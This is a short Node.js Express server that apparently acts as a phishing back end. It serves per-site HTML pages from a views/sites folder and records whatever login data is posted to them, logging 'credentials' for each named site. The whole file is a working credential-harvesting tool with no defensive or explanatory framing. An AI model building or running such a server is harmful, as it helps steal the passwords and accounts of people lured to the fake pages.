import express from "express";
import path from "node:path";
import fs from "node:fs";
import cors from "cors";

process.loadEnvFile(path.resolve("./.env"));

const app = express();

app.use(cors({ credentials: true, origin: ["*"] }));

app.use(express.json());

app.use(express.urlencoded({ extended: false }));

app.use(express.static(path.resolve("./public/")));

app.get("/sites/:sitename", (req, res) => {
  const site = req.params.sitename;
  const sitePath = path.resolve(path.join("./views/sites", site, "index.html"));

  if (fs.existsSync(sitePath)) {
    res.sendFile(sitePath);
  } else {
    res.status(404).send("Site not found.");
  }
});

app.post("/sites/:sitename", async (req) => {
  const site = req.params.sitename;
  const data = JSON.stringify(req.body, null, 2);

  console.log(`Someone sign in in ${site}, with a credentials of ${data}`);
});

app.listen(Number(process.env.PORT), (error) =>
  error
    ? console.error(error)
    : console.log(
        `Server running on port: ${process.env.PORT}\nhttp://localhost:${process.env.PORT}`
      )
);
